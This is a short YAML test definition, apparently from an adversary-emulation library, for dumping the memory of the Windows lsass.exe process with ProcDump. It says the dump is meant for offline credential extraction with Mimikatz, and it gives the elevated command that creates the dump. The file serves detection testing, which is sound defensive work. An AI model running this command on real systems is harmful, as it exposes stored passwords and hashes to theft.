# Atomic 1 — Dump LSASS.exe Memory using ProcDump
name: Dump LSASS.exe Memory using ProcDump
description: |
  The memory of lsass.exe is often dumped for offline credential
  theft attacks. Adversaries commonly perform offline analysis
  with Mimikatz to extract plaintext passwords and hashes.
supported_platforms:
  - windows
input_arguments:
  output_file:
    type: path
    description: Path where dump will be written
    default: "%TEMP%\\lsass_dump.dmp"
  procdump_path:
    type: path
    default: "C:\\Tools\\procdump.exe"
executor:
  name: command_prompt
  elevation_required: true
  command: |
    #{procdump_path} -accepteula -ma lsass.exe #{output_file}
